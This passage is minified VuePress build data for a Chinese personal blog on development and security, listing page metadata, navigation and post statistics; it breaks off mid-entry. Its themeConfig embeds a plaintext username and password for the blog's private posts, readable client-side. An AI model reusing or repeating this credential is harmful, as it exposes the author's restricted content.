:ballot_box_with_check:            🔘 :radio_button:                🔗 :link:\n➰ :curly_loop:                        〰️ :wavy_dash:                   〽️ :part_alternation_mark:\n🔱 :trident:                          ▪️ :black_square:                🔳 :white_square:\n✅ :white_check_mark:                  🔲 :black_square_button:         ⬛️:black_large_square:\n⚫️ :black_circle:                     ⚪️ :white_circle:                🔴 :red_circle:\n🔵 :large_blue_circle:                🔷 :large_blue_diamond:          🔶 :large_orange_diamond:\n🔹 :small_blue_diamond:               🔸 :small_orange_diamond:        🔺 :small_red_triangle:\n🔻 :small_red_triangle_down:                                           ",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"私密文章测试",frontmatter:{title:"私密文章测试",date:"2022-05-14T08:14:22.000Z",permalink:"/more/blog/privatepage",categories:["更多","博客搭建"],tags:[null],readingShow:"top"},regularPath:"/04.%E6%9B%B4%E5%A4%9A/400.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/01.%E7%A7%81%E5%AF%86%E6%96%87%E7%AB%A0%E6%B5%8B%E8%AF%95.html",relativePath:"04.更多/400.博客搭建/01.私密文章测试.md",key:"v-a67c2976",path:"/more/blog/privatepage/",headers:[{level:2,title:"设置文章为私密",slug:"设置文章为私密",normalizedTitle:"设置文章为私密",charIndex:13},{level:2,title:"私密文章配置方法",slug:"私密文章配置方法",normalizedTitle:"私密文章配置方法",charIndex:337}],headersStr:"设置文章为私密 私密文章配置方法",content:"# 私密文章测试\n\n\n# 设置文章为私密\n\n这是一个私密文章，用户需要输入密码才能查看（页面开源的情况下不支持）\n\n设置文章为私密，并且使用全局私密设置添加如下配置即可：\n\n---\nprivate: true     # 开启文章私密，必须\n---\n\n\n1\n2\n3\n\n\n设置文章为私密并且不使用全局密码需要添加如下配置：\n\n---\nprivate: true     # 开启文章私密，必须\nusername: vdoing  # 用户名，必须\npassword: 123456  # 密码，必须\nexpire: 86400000  # 登录超时时间（毫秒），可选（不填则以全局超时时间为准，如果全局也没有设置，则默认是一天）\n---\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 私密文章配置方法\n\n参考：https://notes.youngkbt.cn/about/website/private/",normalizedContent:"# 私密文章测试\n\n\n# 设置文章为私密\n\n这是一个私密文章，用户需要输入密码才能查看（页面开源的情况下不支持）\n\n设置文章为私密，并且使用全局私密设置添加如下配置即可：\n\n---\nprivate: true     # 开启文章私密，必须\n---\n\n\n1\n2\n3\n\n\n设置文章为私密并且不使用全局密码需要添加如下配置：\n\n---\nprivate: true     # 开启文章私密，必须\nusername: vdoing  # 用户名，必须\npassword: 123456  # 密码，必须\nexpire: 86400000  # 登录超时时间（毫秒），可选（不填则以全局超时时间为准，如果全局也没有设置，则默认是一天）\n---\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 私密文章配置方法\n\n参考：https://notes.youngkbt.cn/about/website/private/",charsets:{cjk:!0},lastUpdated:"2022/05/14, 00:26:33",lastUpdatedTimestamp:1652487993e3},{title:"AboutME",frontmatter:{title:"AboutME",date:"2019-12-25T14:27:01.000Z",permalink:"/about",sidebar:!1,article:!1,readingShow:"top"},regularPath:"/05.%E5%85%B3%E4%BA%8E/01.%E5%85%B3%E4%BA%8E.html",relativePath:"05.关于/01.关于.md",key:"v-2555ef69",path:"/about/",headers:[{level:2,title:"📚Blog",slug:"📚blog",normalizedTitle:"📚blog",charIndex:2},{level:2,title:"🎨Theme",slug:"🎨theme",normalizedTitle:"🎨theme",charIndex:184},{level:2,title:"🐼Me",slug:"🐼me",normalizedTitle:"🐼me",charIndex:336},{level:3,title:"技能",slug:"技能",normalizedTitle:"技能",charIndex:369},{level:2,title:"公众号",slug:"公众号",normalizedTitle:"公众号",charIndex:498},{level:2,title:"✉️ 联系",slug:"联系",normalizedTitle:"✉️ 联系",charIndex:507},{level:2,title:"变更记录~",slug:"变更记录",normalizedTitle:"变更记录~",charIndex:584}],headersStr:"📚Blog 🎨Theme 🐼Me 技能 公众号 ✉️ 联系 变更记录~",content:"# 📚Blog\n\n这是一个兼具博客文章、知识管理、文档查找的个人网站，主要内容是Web开发和安全相关技术。博客使用Github Actions和Vuepress-theme-vdoing搭建，如果你喜欢这个博客&主题欢迎到GitHub点个Star，或者交换友链 ( •̀ ω •́ )✧\n\n提示\n\n文章内容仅是我个人的小总结，资历尚浅，如有误还请指正。\n\n\n\n\n# 🎨Theme\n\n\n\n本站主题是 Vdoing，这是一款简洁高效的VuePress 知识管理&博客 主题。旨在轻松打造一个结构化与碎片化并存的个人在线知识库&博客，让你的知识海洋像一本本书一样清晰易读。配合多维索引，让每一个知识点都可以快速定位！ Github地址 | 在线vscode预览源码\n\n\n# 🐼Me\n\n一个开发和安全的小白，不断摸索和学习技术中~\n\n\n# 技能\n\n * 熟悉 JavaScript、HTML、CSS、Vue、React 的拼写\n * 了解 Linux、windows、macOS 的开关机方式\n * 精通 Git 的 pull 和 push，并注册了 GitHub 帐号刷了一些 star\n\n\n# 公众号\n\n\n\n# ✉️ 联系\n\n * Email: p0josec@gmail.com\n * GitHub: https://github.com/p0josec\n\n\n# 变更记录~\n\n",normalizedContent:"# 📚blog\n\n这是一个兼具博客文章、知识管理、文档查找的个人网站，主要内容是web开发和安全相关技术。博客使用github actions和vuepress-theme-vdoing搭建，如果你喜欢这个博客&主题欢迎到github点个star，或者交换友链 ( • ω • )✧\n\n提示\n\n文章内容仅是我个人的小总结，资历尚浅，如有误还请指正。\n\n\n\n\n# 🎨theme\n\n\n\n本站主题是 vdoing，这是一款简洁高效的vuepress 知识管理&博客 主题。旨在轻松打造一个结构化与碎片化并存的个人在线知识库&博客，让你的知识海洋像一本本书一样清晰易读。配合多维索引，让每一个知识点都可以快速定位！ github地址 | 在线vscode预览源码\n\n\n# 🐼me\n\n一个开发和安全的小白，不断摸索和学习技术中~\n\n\n# 技能\n\n * 熟悉 javascript、html、css、vue、react 的拼写\n * 了解 linux、windows、macos 的开关机方式\n * 精通 git 的 pull 和 push，并注册了 github 帐号刷了一些 star\n\n\n# 公众号\n\n\n\n# ✉️ 联系\n\n * email: p0josec@gmail.com\n * github: https://github.com/p0josec\n\n\n# 变更记录~\n\n",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:59:11",lastUpdatedTimestamp:1651852751e3},{title:"私密文章登录",frontmatter:{title:"私密文章登录",date:"2022-05-14T14:26:04.000Z",permalink:"/private/login/",sidebar:!1,article:!1,comment:!1,editLink:!1,readingShow:"top"},regularPath:"/99.%E7%A7%81%E5%AF%86%E6%96%87%E7%AB%A0%E7%99%BB%E5%BD%95.html",relativePath:"99.私密文章登录.md",key:"v-3b782278",path:"/private/login/",headersStr:null,content:"您当前访问的是博主的私密文章，请输入有效的用户名和密码。如果没有，请向博主获取。",normalizedContent:"您当前访问的是博主的私密文章，请输入有效的用户名和密码。如果没有，请向博主获取。",charsets:{cjk:!0},lastUpdated:"2022/05/14, 00:26:33",lastUpdatedTimestamp:1652487993e3},{title:"归档",frontmatter:{archivesPage:!0,title:"归档",permalink:"/archives/",article:!1,readingShow:"top"},regularPath:"/@pages/archivesPage.html",relativePath:"@pages/archivesPage.md",key:"v-4e7874b6",path:"/archives/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/03, 11:09:41",lastUpdatedTimestamp:1648984181e3},{title:"分类",frontmatter:{categoriesPage:!0,title:"分类",permalink:"/categories/",article:!1,readingShow:"top"},regularPath:"/@pages/categoriesPage.html",relativePath:"@pages/categoriesPage.md",key:"v-0cedb105",path:"/categories/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/03, 11:09:41",lastUpdatedTimestamp:1648984181e3},{title:"标签",frontmatter:{tagsPage:!0,title:"标签",permalink:"/tags/",article:!1,readingShow:"top"},regularPath:"/@pages/tagsPage.html",relativePath:"@pages/tagsPage.md",key:"v-40954b25",path:"/tags/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/03, 11:09:41",lastUpdatedTimestamp:1648984181e3},{title:"Home",frontmatter:{home:!0,heroText:"上校的玩具间",tagline:"欲买桂花同载酒，终不似、少年游。",pageClass:"vdoing-index-class",postList:"detailed",readingShow:"top"},regularPath:"/",relativePath:"index.md",key:"v-fd425884",path:"/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/05/06, 12:28:14",lastUpdatedTimestamp:1651840094e3}],themeConfig:{nav:[{text:"首页",link:"/"},{text:"开发",link:"/dev/",items:[{text:"前端",items:[{text:"前端目录",link:"/dev/web/"},{text:"HTML/CSS基础",link:"/dev/web/basis/htmlandcss/"}]},{text:"后端",items:[{text:"Java后端",link:"/dev/java/"},{text:"Spring",link:"/dev/java/core/spring5/"},{text:"Mybatis",link:"/dev/java/core/mybatis/"},{text:"SpringMVC",link:"/dev/java/core/springmvc/"},{text:"Springboot基础篇",link:"/dev/java/core/springbootbase/"},{text:"Docker",link:"/dev/java/eco/docker/"}]},{text:"计算机基础",link:"/dev/basic/"}]},{text:"安全",link:"/sec/",items:[{text:"静态分析",link:"/sec/sa/"},{text:"漏洞原理",link:"/sec/vuln/"},{text:"安全开发",link:"/sec/dev/"}]},{text:"生活",link:"/life/"},{text:"站点导航",link:"/navigation/"},{text:"更多",link:"/more/",items:[{text:"分类",link:"/categories/"},{text:"标签",link:"/tags/"},{text:"归档",link:"/archives/"},{text:"关于",link:"/about/"},{text:"博客搭建",link:"/more/blog/"}]},{text:"Travelling",link:"https://travellings.link/"}],sidebarDepth:2,logo:"https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/logo.png",searchMaxSuggestions:10,lastUpdated:"上次更新",docsDir:"docs",editLinks:!1,editLinkText:"编辑",docBranch:"main",indexImg:{navColor:2,switchNavColor:!0,bgTimeColor:!0,bgTimeColorArray:["transparent","transparent","transparent","transparent"],descFade:!0,desc:["欲买桂花同载酒，终不似、少年游。"],descFontSize:"1.4rem",descFadeInTime:200,descFadeOutTime:100,descNextTime:800,bubble:!0,bubblePosition:0,bubbleNum:100},privatePage:{username:"p0jo",password:"123.bmk!",expire:864e5,loginPath:"/private/login/",loginKey:"vdoing_login",loginSession:!1},blogInfo:{blogCreate:"2022-01-01",indexView:!0,pageView:!0,readingTime:!0,eachFileWords:[{name:"开发",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/00.导航栏/01.开发.md",wordsCount:62,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.开发",description:"有关前后端开发的相关技术。"}},title:"开发",date:"2021-10-21T16:43:47.000Z",permalink:"/dev/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"安全",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/00.导航栏/02.安全.md",wordsCount:65,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.安全",description:"渗透测试、代码审计相关的知识总结。"}},title:"安全",date:"2021-10-21T16:43:47.000Z",permalink:"/sec/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"生活",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/00.导航栏/03.生活.md",wordsCount:58,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"03.生活",description:"闲来无事、写点什么。"}},title:"生活",date:"2021-10-21T16:43:47.000Z",permalink:"/life/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"更多",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/00.导航栏/04.更多.md",wordsCount:64,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"04.更多",description:"其他一些未归档的内容暂存此处。"}},title:"更多",date:"2021-10-21T16:43:47.000Z",permalink:"/more/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"前端",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/01.开发/00.前端.md",wordsCount:56,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.开发/100.前端",description:"前端开发相关技术总结。"}},title:"前端",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/web/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"后端",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/01.开发/01.后端.md",wordsCount:45,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.开发/101.后端",description:"Java后端开发笔记。"}},title:"后端",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/java/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"计算机基础",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/01.开发/02.计算机基础.md",wordsCount:58,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"01.开发/102.计算机基础",description:"计算机科学与技术专业基础知识。"}},title:"计算机基础",date:"2022-01-16T17:47:41.000Z",permalink:"/dev/basic/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"静态分析",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/02.安全/00.静态分析.md",wordsCount:59,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.安全/200.静态分析",description:"程序分析概念和知识。"}},title:"静态分析",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/sa/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"漏洞原理",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/02.安全/01.漏洞原理.md",wordsCount:61,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.安全/201.漏洞原理",description:"常见通用漏洞的原理分析。"}},title:"漏洞原理",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/vuln/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"安全开发",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/02.安全/02.安全开发.md",wordsCount:62,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.安全/202.安全开发",description:"安全相关的工具开发和利用。"}},title:"安全开发",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/dev/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"奇淫巧技",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/02.安全/03.奇淫巧技.md",wordsCount:58,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"02.安全/203.奇淫巧技",description:"安全相关的骚操作。"}},title:"奇淫巧技",date:"2022-01-16T17:47:41.000Z",permalink:"/sec/skill/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:"博客搭建",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/00.目录页/04.更多/00.博客搭建.md",wordsCount:57,readingTime:"1",pageComponent:{name:"Catalogue",data:{path:"04.更多/400.博客搭建",description:"搭建博客的记录。"}},title:"博客搭建",date:"2022-01-16T17:47:41.000Z",permalink:"/more/blog/",sidebar:!1,article:!1,comment:!1,editLink:!1},{name:" HTML&CSS基础",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/100.前端/1000.前端基础/00. HTML&CSS基础.md",wordsCount:"13k",readingTime:"49.9m",title:"HTML&CSS基础",date:"2022-03-04T00:00:00.000Z",permalink:"/dev/web/basis/htmlandcss",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","前端","前端基础"],tags:["HTML","CSS"],private:!0},{name:"Spring5",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1011.微服务核心/00.Spring5.md",wordsCount:"8.5k",readingTime:"40.5m",title:"Spring5",date:"2022-01-01T00:00:00.000Z",permalink:"/dev/java/core/spring5",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Spring5"]},{name:"SpringMVC",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1011.微服务核心/01.SpringMVC.md",wordsCount:"12k",readingTime:"52.5m",title:"SpringMVC",date:"2022-01-06T00:00:00.000Z",permalink:"/dev/java/core/springmvc",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","SpringMVC"]},{name:"Mybatis",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1011.微服务核心/02.Mybatis.md",wordsCount:"10.5k",readingTime:"49.7m",title:"MyBatis",date:"2022-01-11T00:00:00.000Z",permalink:"/dev/java/core/mybatis",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Mabatis"]},{name:"MyBatisPlus",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1011.微服务核心/03.MyBatisPlus.md",wordsCount:"5.4k",readingTime:"24.9m",title:"MyBatis-Plus",date:"2022-01-16T00:00:00.000Z",permalink:"/dev/java/core/mybatisplus",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Mabatis","MyBatisPlus"]},{name:"SSM",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1011.微服务核心/04.SSM.md",wordsCount:"5.8k",readingTime:"30.7m",title:"SSM",date:"2022-02-21T00:00:00.000Z",permalink:"/dev/java/core/ssm",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","Mabatis","Spring","SpringMVC"]},{name:"Springboot",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1011.微服务核心/05.Springboot.md",wordsCount:"19.2k",readingTime:"1h32m",title:"Springboot1 基础篇",date:"2022-04-28T03:11:00.000Z",permalink:"/dev/java/core/springbootbase",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["Springboot","Spring","SpringMVC"]},{name:"Docker",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1012.微服务生态/00.Docker.md",wordsCount:"12.2k",readingTime:"50.7m",title:"Docker",date:"2022-05-01T14:00:00.000Z",permalink:"/dev/java/eco/docker",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务生态"],tags:["K8S","Docker","DockerCompose"]},{name:"SpringSecurity",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1012.微服务生态/01.SpringSecurity.md",wordsCount:"10.5k",readingTime:"47.1m",title:"Spring Security",date:"2022-04-24T09:00:00.000Z",permalink:"/dev/java/eco/springsecurity",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务生态"],tags:["SpringSecurity"]},{name:"Shiro",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1012.微服务生态/02.Shiro.md",wordsCount:"8.6k",readingTime:"42.5m",title:"Shiro",date:"2022-04-15T00:00:00.000Z",permalink:"/dev/java/eco/shiro",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务生态"],tags:["Springboot","Shiro"]},{name:"尚筹网",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1013.项目实战/00.尚筹网.md",wordsCount:"2.8k",readingTime:"13.6m",title:"尚筹网",date:"2022-04-25T09:00:00.000Z",permalink:"/dev/java/project/cf",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","项目实战"],tags:["Java项目"]},{name:"代码片段",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/101.后端/1013.项目实战/01.代码片段.md",wordsCount:347,readingTime:"1.9m",title:"代码片段集合",date:"2022-09-11T09:00:00.000Z",permalink:"/dev/java/project/code",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","项目实战"],tags:["Java项目"]},{name:"概述",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/102.计算机基础/1020.数据结构与算法/00.概述.md",wordsCount:"2.1k",readingTime:"7.9m",title:"【数据结构】概述",date:"2022-05-04T20:00:00.000Z",permalink:"/dev/basic/ds/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","数据结构与算法"],tags:["数据结构"]},{name:"线性表",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/102.计算机基础/1020.数据结构与算法/01.线性表.md",wordsCount:"5.2k",readingTime:"22.5m",title:"【数据结构】线性表",date:"2022-05-06T23:00:00.000Z",permalink:"/dev/basic/ds/list",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","数据结构与算法"],tags:["数据结构","线性表"]},{name:"概述",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/102.计算机基础/1021.计算机网络/00.概述.md",wordsCount:"2.5k",readingTime:"9m",title:"【计算机网络】概述",date:"2022-05-05T23:00:00.000Z",permalink:"/dev/basic/network/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","计算机网络"],tags:["计算机网络"]},{name:"物理层",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/01.开发/102.计算机基础/1021.计算机网络/01.物理层.md",wordsCount:"1.6k",readingTime:"6.1m",title:"【计算机网络】物理层",date:"2022-05-06T00:00:00.000Z",permalink:"/dev/basic/network/physicallayer",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","计算机基础","计算机网络"],tags:["计算机网络"]},{name:"Introduction",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/200.静态分析/2000.南京大学课程笔记/00.Introduction.md",wordsCount:"1.4k",readingTime:"6m",title:"SA - Introduction",date:"2022-02-01T00:00:00.000Z",permalink:"/sec/sa/nju/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA"]},{name:"IR",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/200.静态分析/2000.南京大学课程笔记/01.IR.md",wordsCount:"1.6k",readingTime:"6.6m",title:"SA - IR",date:"2022-02-06T00:00:00.000Z",permalink:"/sec/sa/nju/ir",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA","IR"]},{name:"DFA-Applications",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/200.静态分析/2000.南京大学课程笔记/02.DFA-Applications.md",wordsCount:"2.8k",readingTime:"12.1m",title:"SA - DFA-Applications",date:"2022-02-11T00:00:00.000Z",permalink:"/sec/sa/nju/dfaapplications",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA","DFA"]},{name:"DFA-Foundations",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/200.静态分析/2000.南京大学课程笔记/03.DFA-Foundations.md",wordsCount:"2.2k",readingTime:"9.5m",title:"SA - DFA-Foundations",date:"2022-02-16T00:00:00.000Z",permalink:"/sec/sa/nju/dfafoundations",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA","DFA"]},{name:" CodeQL - UBoot练习项目（上）",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/200.静态分析/2001.CodeQL/00. CodeQL - UBoot练习项目（上）.md",wordsCount:"1.9k",readingTime:"8m",title:"CodeQL - UBoot练习项目（上）",date:"2022-04-03T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","CodeQL"],tags:["CodeQL"]},{name:" CodeQL - UBoot练习项目（下）",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/200.静态分析/2001.CodeQL/01. CodeQL - UBoot练习项目（下）.md",wordsCount:"3.1k",readingTime:"12.3m",title:"CodeQL - UBoot练习项目（下）",date:"2022-04-04T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot2",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","CodeQL"],tags:["CodeQL"]},{name:" CodeQL从入门到放弃",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/200.静态分析/2001.CodeQL/02. CodeQL从入门到放弃.md",wordsCount:"2.8k",readingTime:"11.3m",title:"CodeQL从入门到放弃",date:"2022-04-05T00:00:00.000Z",permalink:"/sec/sa/codeql/codeqlstep0to1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","CodeQL"],tags:["CodeQL"]},{name:"反序列化原理-反射",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/201.漏洞原理/2010.反序列化漏洞/00.反序列化原理-反射.md",wordsCount:"1.8k",readingTime:"7.3m",title:"反序列化漏洞原理 - 反射",date:"2022-03-12T00:00:00.000Z",permalink:"/sec/vuln/deserialization/reflaction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","漏洞原理"]},{name:"URLDNS分析",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/201.漏洞原理/2010.反序列化漏洞/01.URLDNS分析.md",wordsCount:"2.2k",readingTime:"9.5m",title:"URLDNS链分析",date:"2022-03-12T12:00:00.000Z",permalink:"/sec/vuln/deserialization/urldns",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","URLDNS","ysoserial"]},{name:"CC1分析",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/201.漏洞原理/2010.反序列化漏洞/02.CC1分析.md",wordsCount:"5.1k",readingTime:"22.4m",title:"CC1分析",date:"2022-03-13T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","CC","ysoserial"]},{name:"CC6分析",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/201.漏洞原理/2010.反序列化漏洞/03.CC6分析.md",wordsCount:"1.1k",readingTime:"5.1m",title:"CC6分析",date:"2022-03-20T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc6",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","CC","ysoserial"]},{name:"反序列化原理-反序列化",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/201.漏洞原理/2010.反序列化漏洞/04.反序列化原理-反序列化.md",wordsCount:"1.7k",readingTime:"7.5m",title:"反序列化漏洞原理 - 反序列化",date:"2022-05-25T00:00:00.000Z",permalink:"/sec/vuln/deserialization/serialization",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","漏洞原理"]},{name:"Python字符串的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/00.Python字符串的那些事.md",wordsCount:"2.1k",readingTime:"8.4m",title:"Python字符串的那些事",date:"2022-03-22T00:00:00.000Z",permalink:"/sec/dev/python/pystring",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python序列的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/01.Python序列的那些事.md",wordsCount:"4.5k",readingTime:"20.3m",title:"Python序列的那些事",date:"2022-03-22T12:00:00.000Z",permalink:"/sec/dev/python/sequence",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python流程控制的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/02.Python流程控制的那些事.md",wordsCount:"1.6k",readingTime:"6.4m",title:"Python流程控制的那些事",date:"2022-03-22T20:00:00.000Z",permalink:"/sec/dev/python/process",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python函数的小秘密",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/03.Python函数的小秘密.md",wordsCount:"2.4k",readingTime:"9.1m",title:"Python函数的小秘密",date:"2022-03-23T20:00:00.000Z",permalink:"/sec/dev/python/func",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python面向对象的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/04.Python面向对象的那些事.md",wordsCount:"3.9k",readingTime:"15.9m",title:"Python面向对象的那些事",date:"2022-03-25T20:00:00.000Z",permalink:"/sec/dev/python/oop",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python异常处理的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/05.Python异常处理的那些事.md",wordsCount:"1.6k",readingTime:"6.3m",title:"Python异常处理的那些事",date:"2022-03-26T20:00:00.000Z",permalink:"/sec/dev/python/exception",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"]},{name:"Python文件操作的那些事",filePath:"/home/runner/work/ischjm.github.io/ischjm.github.io/docs/02.安全/202.安全开发/2020.Python/06.Python文件操作的那些事.md",wordsCount:"3.5k",readingTime:"14.5m",title:"Python文件操作的那些事",date:"2022-03-26T23:00:00.000Z",permalink:"/sec/dev/python/file",author:{name:"p0jo",link:"https://wiki.pw